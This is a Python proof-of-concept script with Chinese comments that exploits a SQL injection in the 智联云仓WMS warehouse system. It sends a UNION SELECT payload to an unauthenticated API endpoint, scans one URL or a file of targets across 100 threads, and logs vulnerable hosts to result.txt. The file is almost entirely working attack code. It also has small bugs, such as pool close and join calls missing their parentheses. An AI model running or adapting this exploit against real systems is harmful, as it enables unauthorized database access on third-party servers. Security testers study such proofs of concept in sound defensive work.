# poc 模板的写法
import argparse,sys,requests,json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    test = """
░██       ░██ ░███     ░███   ░██████                 ░██████     ░██████   ░██         ░██
░██       ░██ ░████   ░████  ░██   ░██               ░██   ░██   ░██   ░██  ░██            
░██  ░██  ░██ ░██░██ ░██░██ ░██                     ░██         ░██     ░██ ░██         ░██
░██ ░████ ░██ ░██ ░████ ░██  ░████████               ░████████  ░██     ░██ ░██         ░██
░██░██ ░██░██ ░██  ░██  ░██         ░██                     ░██ ░██     ░██ ░██         ░██
░████   ░████ ░██       ░██  ░██   ░██               ░██   ░██   ░██   ░██  ░██         ░██
░███     ░███ ░██       ░██   ░██████   ░██████████   ░██████     ░██████   ░██████████ ░██
                                                                       ░██                 
                                                                        ░██                
                                                                      author:SIS2507
                                                                      version:1.0
                                                                      project:信息泄露                   
"""
    print(test)
def main():
    banner()
    # sqlmap 都需要通过命令行传递参数
    # 单个url和一个文件
    # 初始化
    parse = argparse.ArgumentParser(description="智联云仓WMS 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        #多线程处理
        url_list = []#用于接收文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")
def poc(target):
    link = "/api/org/enterpriseaccountnoauth/geticp?enterprise_code=1%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d7346475364634d6e4d426a4261466f51717577564359486f7a594571,0x71767a7171),NULL,NULL,NULL--%20-"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
    }
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
           res2 = requests.get(url=target+link,headers=headers,verify=False,timeout=5)
                    
                    
        if "message" in res2.text:
            print(f"[+]该{target}存在信息泄露")
                                #把结果写入到一个文件
            with open('result.txt','a',encoding="utf-8") as f:
                f.write(f"[+]该{target}存在信息泄露,\n")
        else:
            print(f"[-]该{target}不存在信息泄露")
    except:
        print(f"该{target}存在问题，请手工测试")  


  # 函数入口

if __name__ == "__main__":
    main()
